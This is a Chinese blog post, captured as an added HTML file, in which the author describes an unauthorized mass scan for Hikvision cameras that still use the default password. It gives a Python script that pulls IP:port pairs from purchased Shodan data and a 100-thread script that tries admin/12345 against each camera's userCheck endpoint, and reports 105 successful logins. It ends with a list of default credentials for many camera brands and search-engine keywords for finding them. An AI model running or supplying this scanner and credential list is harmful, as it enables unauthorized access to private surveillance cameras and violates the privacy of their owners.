@@ -1,0 +1,281 @@
+<!doctype html><html lang=zh-cn><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=robots content="noodp"><meta http-equiv=x-ua-compatible content="IE=edge, chrome=1"><title>针对海康威视网络摄像头弱密码的一次扫描 - zu1k</title><meta name=description content="A boy dreaming of traveling around the world.<br>This blog is used to record my study, thinking and life."><meta name=keywords content="zu1k,zuik,zu1k.com,网络安全,思考,逆向"><meta name=author content="zu1k"><meta property="og:title" content="针对海康威视网络摄像头弱密码的一次扫描"><meta property="og:description" content="前言 在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制we"><meta property="og:type" content="article"><meta property="og:url" content="https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/"><meta property="og:image" content="https://zu1k.com/images/logo.jpg"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-11-28T20:15:06+08:00"><meta property="article:modified_time" content="2023-01-03T09:11:33+08:00"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://zu1k.com/images/logo.jpg"><meta name=twitter:title content="针对海康威视网络摄像头弱密码的一次扫描"><meta name=twitter:description content="前言 在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制we"><meta name=application-name content="zu1k"><meta name=apple-mobile-web-app-title content="zu1k"><meta name=theme-color content="#ffffff"><meta name=msapplication-TileColor content="#da532c"><meta itemprop=name content="针对海康威视网络摄像头弱密码的一次扫描"><meta itemprop=description content="前言 在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制we"><meta itemprop=datePublished content="2019-11-28T20:15:06+08:00"><meta itemprop=dateModified content="2023-01-03T09:11:33+08:00"><meta itemprop=wordCount content="1782"><meta itemprop=image content="https://zu1k.com/images/logo.jpg"><meta itemprop=keywords content="scan,web,"><link rel="shortcut icon" type=image/x-icon href=../../../../favicon.ico><link rel=icon type=image/png sizes=32x32 href=../../../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../../../favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=../../../../apple-touch-icon.png><link rel=mask-icon href=../../../../apple-touch-icon.png color=#5bbad5><link rel=manifest href=../../../../site.webmanifest><link rel=canonical href=https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/><link rel=prev href=https://zu1k.com/posts/learn/maillist/><link rel=next href=https://zu1k.com/posts/learn/some-git-skills/><link rel=stylesheet href=../../../../lib/normalize/normalize.min.css><link rel=stylesheet href=../../../../css/style.min.css><link rel=stylesheet href=../../../../lib/icon/css/icon-embedded.css><script>"serviceWorker"in navigator&&window.addEventListener("load",function(){navigator.serviceWorker.register("/sw_local.js")})</script><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"针对海康威视网络摄像头弱密码的一次扫描","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/zu1k.com\/posts\/security\/web-security\/scan-hikvision-weak-password\/"},"image":[{"@type":"ImageObject","url":"https:\/\/zu1k.com\/images\/logo.jpg","width":256,"height":256}],"genre":"posts","keywords":"scan, web","wordcount":1782,"url":"https:\/\/zu1k.com\/posts\/security\/web-security\/scan-hikvision-weak-password\/","datePublished":"2019-11-28T20:15:06+08:00","dateModified":"2023-01-03T09:11:33+08:00","license":"This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher":{"@type":"Organization","name":"zu1k","logo":"https:\/\/zu1k.com\/images\/logo.jpg"},"author":{"@type":"Person","name":"zu1k"},"description":""}</script></head><body header-desktop=fixed header-mobile=auto><script type=text/javascript>(window.localStorage&&localStorage.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("theme","dark")</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=../../../../ title=zu1k>zu1k</a></div><div class=menu><div class=menu-inner><a class=menu-item href=../../../../posts/>文章 </a><a class=menu-item href=../../../../categories/>分类 </a><a class=menu-item href=../../../../tags/>标签 </a><a class=menu-item href=../../../../projects/>项目 </a><a class=menu-item href=../../../../links/>友链 </a><a class=menu-item href=../../../../about/>关于 </a><a class=menu-item href=../../../../index.xml title=RSS><i class=icon-rss></i> </a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i> </a><span class="menu-item delimiter"></span><span class="menu-item search" id=search-desktop>
+<input type=text placeholder=搜索文章标题或内容... id=search-input-desktop>
+<a class="search-button search-toggle" id=search-toggle-desktop title=搜索><i class=icon-search></i></a>
+<a class="search-button search-clear" id=search-clear-desktop title=清空><i class=icon-cancel-circled></i></a>
+<span class="search-button search-loading" id=search-loading-desktop><i class=icon-spin2></i></span>
+</span><a class="menu-item theme-switch" title=切换主题><i class=icon-adjust></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=../../../../ title=zu1k>zu1k</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><div class=search-wrapper><div class="search mobile" id=search-mobile><input type=text placeholder=搜索文章标题或内容... id=search-input-mobile>
+<a class="search-button search-toggle" id=search-toggle-mobile title=搜索><i class=icon-search></i></a>
+<a class="search-button search-clear" id=search-clear-mobile title=清空><i class=icon-cancel-circled></i></a>
+<span class="search-button search-loading" id=search-loading-mobile><i class=icon-spin2></i></span></div><a class=search-cancel id=search-cancel-mobile>取消</a></div><a class=menu-item href=../../../../posts/ title>文章</a><a class=menu-item href=../../../../categories/ title>分类</a><a class=menu-item href=../../../../tags/ title>标签</a><a class=menu-item href=../../../../projects/ title>项目</a><a class=menu-item href=../../../../links/ title>友链</a><a class=menu-item href=../../../../about/ title>关于</a><a class=menu-item href=../../../../index.xml title=RSS><i class=icon-rss></i></a><a class=menu-item href=https://github.com/zu1k title=GitHub rel="noopener noreffer" target=_blank><i class=icon-github></i></a><a class="menu-item theme-switch" title=切换主题>
+<i class=icon-adjust></i></a></div></div></header><div class="search-dropdown desktop"><div id=search-dropdown-desktop></div></div><div class="search-dropdown mobile"><div id=search-dropdown-mobile></div></div><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>目录</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class=single-title>针对海康威视网络摄像头弱密码的一次扫描</h1><div class=post-meta><div class=post-meta-line>&nbsp;<span class=post-category>收录于 <a href=../../../../categories/coding/><i class=icon-folder></i>编程</a></span></div><div class=post-meta-line><i class=icon-calendar></i>&nbsp;<time datetime=2019-11-28>2019-11-28</time>&nbsp;<i class=icon-pencil></i>&nbsp;约 1782 字&nbsp;
+<i class=icon-clock></i>&nbsp;阅读 4 分钟&nbsp;</div></div><div class="details toc" id=toc-static kept><div class="details-summary toc-title"><span>目录</span>
+<span><i class="details-icon icon-angle-right"></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#前言>前言</a></li><li><a href=#从shodan获取数据>从shodan获取数据</a></li><li><a href=#提取有用信息>提取有用信息</a></li><li><a href=#分析与扫描>分析与扫描</a></li><li><a href=#后话>后话</a></li><li><a href=#弱密码收集>弱密码收集</a></li></ul></nav></div></div><div class=content id=content><h2 id=前言>前言</h2><p>在我上高二的时候，海康威视摄像头被爆出大量公开web访问具有弱密码，那时手动对学校内部的摄像头进行fuzz，成功进入了几个摄像头控制web，能够随意查看学校的监控。</p><p>海康威视web界面的弱密码是 admin 12345</p><p>时隔四年，想要再次对网络上能够访问到的海康威视web管理进行一次批量弱密码扫描</p><h2 id=从shodan获取数据>从shodan获取数据</h2><p>首先需要搞到全网所有能够访问到的海康威视机器的IP，这是个工作量极大的任务，如果自己进行全网服务扫描的话无论是时间周期还是耗费资金都是我无法承受的</p><p>之前了解过shodan，shodan被称为“最恐怖的搜索引擎”，能够提供多年来其扫描到的全网提供的服务，可惜数据的价格极高</p><p>今年黑五是shodan诞生第十年，shodan给出极大的优惠，正式会员+20credit只需要1刀，手头有信用卡和企业邮箱的我二话不说先上了20个账号</p><p>有了shodan的credit就可以购买它的数据了。海康威视的web管理界面的关键词很简单，只需要在shodan搜索“hikvision”</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/scan-hikvision-weak-password/shodan1.png alt=/posts/security/web-security/scan-hikvision-weak-password/shodan1.png title=最新的搜索结果></p><p>在我写这篇博客的时候搜索到的数据有18万条，前段时间我下载数据的时候是19万条。</p><p>下载大量数据是需要花credit的，1credit可以下载1万条数据，所以19万多的数据花费了我20credit，正常情况下20credit是49刀，这次黑五真是太实惠了</p><h2 id=提取有用信息>提取有用信息</h2><p>有了数据之后通过python解析，检查是否存在http服务，如果存在就提取ip和port</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=c1>#-*-coding:utf-8-*-</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>fi</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;shodan_data.json&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>fo</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s2>&#34;ip.txt&#34;</span><span class=p>,</span> <span class=s1>&#39;w&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>line</span> <span class=o>=</span> <span class=n>fi</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>numall</span> <span class=o>=</span> <span class=mi>1</span>
+</span></span><span class=line><span class=cl><span class=n>num</span> <span class=o>=</span> <span class=mi>0</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>while</span> <span class=n>line</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>line</span> <span class=o>=</span> <span class=n>fi</span><span class=o>.</span><span class=n>readline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>numall</span> <span class=o>=</span> <span class=n>numall</span><span class=o>+</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>a</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>line</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s1>&#39;http&#39;</span> <span class=ow>in</span> <span class=n>a</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>num</span> <span class=o>=</span> <span class=n>num</span><span class=o>+</span><span class=mi>1</span>
+</span></span><span class=line><span class=cl>            <span class=n>txt</span> <span class=o>=</span> <span class=n>a</span><span class=p>[</span><span class=s1>&#39;http&#39;</span><span class=p>][</span><span class=s1>&#39;host&#39;</span><span class=p>]</span><span class=o>+</span><span class=s1>&#39;:&#39;</span><span class=o>+</span><span class=nb>str</span><span class=p>(</span><span class=n>a</span><span class=p>[</span><span class=s1>&#39;port&#39;</span><span class=p>])</span><span class=o>+</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span>
+</span></span><span class=line><span class=cl>            <span class=n>fo</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>txt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>txt</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>continue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>fo</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=n>fi</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>numall</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>num</span><span class=p>)</span>
+</span></span></code></pre></td></tr></table></div></div><h2 id=分析与扫描>分析与扫描</h2><p>然后通过多线程python脚本进行弱密码批量扫描。</p><p>通过手工尝试找到一台可以弱密码登录进去的机器，通过burp抓包分析，找到用来验证弱密码的接口。</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/scan-hikvision-weak-password/baseauth.png alt=/posts/security/web-security/scan-hikvision-weak-password/baseauth.png title=登录使用的接口和验证方式></p><p>分析发现登录使用的是base auth，这就简单了。使用的接口是userCheck，如果登录成功应该返回200.</p><p><img class=lazyload src=../../../../svg/loading.min.svg data-src=../../../../posts/security/web-security/scan-hikvision-weak-password/authsuccess.png alt=/posts/security/web-security/scan-hikvision-weak-password/authsuccess.png title=登录成功></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python</span>
+</span></span><span class=line><span class=cl><span class=c1>#-*-coding:utf-8-*-</span>
+</span></span><span class=line><span class=cl><span class=c1>#批量筛选海康威视摄像头的弱密码</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>queue</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>sys</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>Threads</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=n>threadlist</span><span class=o>=</span><span class=p>[]</span>
+</span></span><span class=line><span class=cl>    <span class=n>myqueue</span><span class=o>=</span><span class=n>queue</span><span class=o>.</span><span class=n>Queue</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>ip</span> <span class=ow>in</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;ip.txt&#39;</span><span class=p>,</span><span class=s1>&#39;r&#39;</span><span class=p>):</span> <span class=c1>#扫描出的ip</span>
+</span></span><span class=line><span class=cl>        <span class=n>myqueue</span><span class=o>.</span><span class=n>put</span><span class=p>(</span><span class=n>ip</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>x</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span><span class=mi>100</span><span class=p>):</span>  <span class=c1>#线程数</span>
+</span></span><span class=line><span class=cl>        <span class=n>th</span><span class=o>=</span><span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>scan_Hikvision</span><span class=p>,</span><span class=n>args</span><span class=o>=</span><span class=p>(</span><span class=n>myqueue</span><span class=p>,))</span>
+</span></span><span class=line><span class=cl>        <span class=n>threadlist</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>th</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>threadlist</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>t</span> <span class=ow>in</span> <span class=n>threadlist</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=n>t</span><span class=o>.</span><span class=n>join</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>scan_Hikvision</span><span class=p>(</span><span class=n>myqueue</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=ow>not</span> <span class=n>myqueue</span><span class=o>.</span><span class=n>empty</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>        <span class=n>ip</span><span class=o>=</span><span class=n>myqueue</span><span class=o>.</span><span class=n>get</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[*]scan:&#34;</span><span class=o>+</span><span class=n>ip</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>r</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=p>(</span><span class=s2>&#34;http://</span><span class=si>%s</span><span class=s2>/PSIA/Custom/HIK/userCheck&#34;</span> <span class=o>%</span> <span class=n>ip</span><span class=p>),</span><span class=n>auth</span><span class=o>=</span><span class=p>(</span><span class=s1>&#39;admin&#39;</span><span class=p>,</span><span class=s1>&#39;12345&#39;</span><span class=p>),</span><span class=n>timeout</span><span class=o>=</span><span class=mi>10</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=n>status</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;&lt;statusValue&gt;(.*)&lt;/statusValue&gt;&#39;</span><span class=p>,</span> <span class=n>r</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>status</span><span class=p>[</span><span class=mi>0</span><span class=p>]</span> <span class=o>==</span> <span class=s1>&#39;200&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s1>&#39;[√] Host http://&#39;</span><span class=o>+</span> <span class=n>ip</span> <span class=o>+</span><span class=s1>&#39; Login Success!</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>f</span> <span class=o>=</span> <span class=nb>open</span><span class=p>(</span><span class=s1>&#39;ok.txt&#39;</span><span class=p>,</span> <span class=s1>&#39;a+&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>ip</span><span class=o>+</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=n>f</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                <span class=k>break</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>continue</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span><span class=o>==</span><span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>Threads</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>正好有个美国的vps，就扔到这个服务器上进行扫描，本机也开起来扫</p><p>100线程很快就扫描完毕了，国内外扫描完的结果去重后一共留下105个可登录弱密码。感觉不应该只有这么点，登录后查看只发现一个版本的海康威视，可能是检测弱密码的接口在其他版本中不存在，或者其他版本默认密码更换或者其他原因</p><h2 id=后话>后话</h2><p>海康威视应该是采取了手段来避免弱密码的再次产生，但是之前老版本的DVR还有一部分并没有进行更新，大部分是农村的家庭或工厂监控，大家也都不太懂，并没有修改默认密码</p><p>心里不是滋味，身边也有一些父母的朋友他们让我帮忙安装一些路由器、监控等设备，他们的文化水平不高，当我要给他们修改密码的时候，一部分会选择手机号码，也有一部分让我不要修改密码，说改了别记不住，直接出厂密码就行了，忘了可以看一下说明书</p><p>能不能想出一种办法，既考虑到安全性，又能顾虑到这部分人的需求，这是个问题</p><h2 id=弱密码收集>弱密码收集</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span><span class=lnt>54
+</span><span class=lnt>55
+</span><span class=lnt>56
+</span><span class=lnt>57
+</span><span class=lnt>58
+</span><span class=lnt>59
+</span><span class=lnt>60
+</span><span class=lnt>61
+</span><span class=lnt>62
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>1.海康威视IP网络摄像机：
+</span></span><span class=line><span class=cl>用户：admin，密码：12345
+</span></span><span class=line><span class=cl>zoomeye搜索关键词：hikvision
+</span></span><span class=line><span class=cl>2.大华网络摄像机：
+</span></span><span class=line><span class=cl>user:admin pass:admin 管理权限
+</span></span><span class=line><span class=cl>user:default pass:user 用户默认登陆帐号
+</span></span><span class=line><span class=cl>user:888888 pass:admin
+</span></span><span class=line><span class=cl>user:666666 pass:user
+</span></span><span class=line><span class=cl>zoomeye搜索关键词：WEB SERVICE
+</span></span><span class=line><span class=cl>3.cctv摄像机：
+</span></span><span class=line><span class=cl>user：admin pass：空
+</span></span><span class=line><span class=cl>telnet登陆 user：root pass：”juantech”
+</span></span><span class=line><span class=cl>zoomeye搜索关键词：JAWS/1.0
+</span></span><span class=line><span class=cl>4.SQ-WEBCAM摄像机：
+</span></span><span class=line><span class=cl>user：admin pass：admin
+</span></span><span class=line><span class=cl>zoomeye搜索关键词：SQ-WEBCAM
+</span></span><span class=line><span class=cl>ACTi: admin/123456 or Admin/123456
+</span></span><span class=line><span class=cl>American Dynamics: admin/admin or admin/9999
+</span></span><span class=line><span class=cl>Arecont Vision: none
+</span></span><span class=line><span class=cl>Avigilon: admin/admin
+</span></span><span class=line><span class=cl>Axis: traditionally root/pass, new Axis cameras require password creation during first login
+</span></span><span class=line><span class=cl>Basler: admin/admin
+</span></span><span class=line><span class=cl>Bosch: none
+</span></span><span class=line><span class=cl>Brickcom: admin/admin
+</span></span><span class=line><span class=cl>Canon: root/camera
+</span></span><span class=line><span class=cl>Cisco: No default password, requires creation during first login
+</span></span><span class=line><span class=cl>Dahua: admin/admin
+</span></span><span class=line><span class=cl>Digital Watchdog: admin/admin
+</span></span><span class=line><span class=cl>DRS: admin/1234
+</span></span><span class=line><span class=cl>DVTel: Admin/1234
+</span></span><span class=line><span class=cl>DynaColor: Admin/1234
+</span></span><span class=line><span class=cl>FLIR: admin/fliradmin
+</span></span><span class=line><span class=cl>Foscam: admin/
+</span></span><span class=line><span class=cl>GeoVision: admin/admin
+</span></span><span class=line><span class=cl>Grandstream: admin/admin
+</span></span><span class=line><span class=cl>Hikvision: admin/12345
+</span></span><span class=line><span class=cl>Honeywell: admin/1234
+</span></span><span class=line><span class=cl>IQinVision: root/system
+</span></span><span class=line><span class=cl>IPX-DDK: root/admin or root/Admin\
+</span></span><span class=line><span class=cl>JVC: admin/jvc
+</span></span><span class=line><span class=cl>March: Networks: admin/
+</span></span><span class=line><span class=cl>Mobotix: admin/meinsm
+</span></span><span class=line><span class=cl>Panasonic: admin/12345
+</span></span><span class=line><span class=cl>Pelco Sarix: admin/admin
+</span></span><span class=line><span class=cl>Pixord: admin/admin
+</span></span><span class=line><span class=cl>Samsung Electronics: root/root or admin/4321
+</span></span><span class=line><span class=cl>Samsung Techwin (old): admin/1111111
+</span></span><span class=line><span class=cl>Samsung (new): admin/4321
+</span></span><span class=line><span class=cl>Sanyo: admin/admin
+</span></span><span class=line><span class=cl>Scallop: admin/password
+</span></span><span class=line><span class=cl>Sentry360 (mini): admin/1234
+</span></span><span class=line><span class=cl>Sentry360 (pro): none
+</span></span><span class=line><span class=cl>Sony: admin/admin
+</span></span><span class=line><span class=cl>Speco: admin/1234
+</span></span><span class=line><span class=cl>Stardot: admin/admin
+</span></span><span class=line><span class=cl>Starvedia: admin/
+</span></span><span class=line><span class=cl>Trendnet: admin/admin
+</span></span><span class=line><span class=cl>Toshiba: root/ikwd
+</span></span><span class=line><span class=cl>VideoIQ: supervisor/supervisor
+</span></span><span class=line><span class=cl>Vivotek: root/
+</span></span><span class=line><span class=cl>Ubiquiti: ubnt/ubnt
+</span></span><span class=line><span class=cl>Wodsee: admin/
+</span></span></code></pre></td></tr></table></div></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span>更新于 2023-01-03&nbsp;<a class=git-hash href=https://github.com/zu1k/blog/commit/ae3381bc545582a739ebaf7d8a620343711c9cfa target=_blank title="commit by zu1k(i@zu1k.com) ae3381bc545582a739ebaf7d8a620343711c9cfa: init">
+<i class=icon-hashtag></i>ae3381b</a></span></div><div class=post-info-license></div></div><div class=post-info-line><div class=post-info-md><span><a class=link-to-markdown href=../../../../posts/security/web-security/scan-hikvision-weak-password/index.md target=_blank>阅读原始文档</a></span></div><div class=post-info-share><span><a title="分享到 Twitter" data-sharer=twitter data-url=https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/ data-title=针对海康威视网络摄像头弱密码的一次扫描 data-via=zu1k_lv data-hashtags=scan,web><i class=icon-twitter></i>
+</a><a title="分享到 Tumblr" data-sharer=tumblr data-url=https://zu1k.com/posts/security/web-security/scan-hikvision-weak-password/ data-title=针对海康威视网络摄像头弱密码的一次扫描 data-tags=scan,web><i class=icon-tumblr></i>
